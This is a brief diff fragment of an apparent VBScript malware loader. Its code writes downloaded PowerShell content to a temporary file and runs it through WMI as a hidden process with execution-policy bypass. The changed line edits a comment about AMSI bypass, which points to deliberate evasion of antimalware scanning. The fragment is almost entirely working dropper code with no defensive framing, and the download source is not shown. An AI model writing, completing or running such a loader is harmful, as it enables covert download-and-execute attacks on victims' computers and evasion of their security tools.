@@ -24,7 +24,7 @@ If xh.Status = 200 Then
     f.Write ps1Content
     f.Close
 
-    ' 3. Run via WMI with NO AMSI bypass
+    ' 3. Run via WMI with NO AMSI bypass string
     Dim finalCmd : finalCmd = "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & tempPs1 & """"
     
     Dim wmi: Set wmi = GetObject("winmgmts:\\.\root\cimv2")
